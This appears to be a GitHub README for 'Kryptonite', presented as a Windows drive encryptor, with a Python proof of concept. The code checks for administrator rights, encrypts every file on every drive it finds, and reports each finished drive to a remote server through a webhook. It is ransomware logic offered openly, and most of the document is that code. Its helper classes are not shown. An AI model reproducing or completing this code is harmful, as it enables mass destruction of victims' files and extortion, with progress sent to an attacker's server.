# Kryptonite
Driver encryptor 4 windows
# Proof of concept:
```py
class Main:
    def __init__(self: Main):
        # made by YWG John
        # check if file is running as admin
        try:
            if ctypes.windll.shell32.IsUserAnAdmin() != 0:
                        # grab all the drives on disk
                        drives:    dict[str, list[str]] = Drives().drives()
                        encryptor: Encryptor            = Encryptor() 
                        # iterate thru the drives
                        for drive, files in drives.items():
                            # iterate thru the drive
                            for file in files:
                                # encrypt file
                                encryptor.encrypt_file(path=file)
                            # notify server
                            encryptor.hook.message(f"**[+] finished encrypting {drive} drive [+]**")
        except:
            quit()


if __name__ == "__main__":
    _ = Main()
```
